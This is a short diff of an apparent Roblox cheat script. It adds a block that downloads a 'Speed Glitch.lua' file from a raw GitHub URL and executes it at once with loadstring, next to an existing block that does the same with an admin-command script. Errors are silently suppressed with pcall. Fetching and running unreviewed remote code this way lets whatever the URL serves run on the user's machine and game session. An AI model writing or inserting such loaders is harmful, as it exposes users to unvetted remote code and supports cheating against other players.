@@ -12,6 +12,12 @@ end)
 
 task.spawn(function()
     local success, err = pcall(function()
+        loadstring(game:HttpGet('https://raw.githubusercontent.com/transpervpyinstaller/soft/refs/heads/main/Speed%20Glitch.lua'))()
+    end)
+end)
+
+task.spawn(function()
+    local success, err = pcall(function()
         loadstring(game:HttpGet('https://raw.githubusercontent.com/EdgeIY/infiniteyield/master/source'))()
     end)
 end)
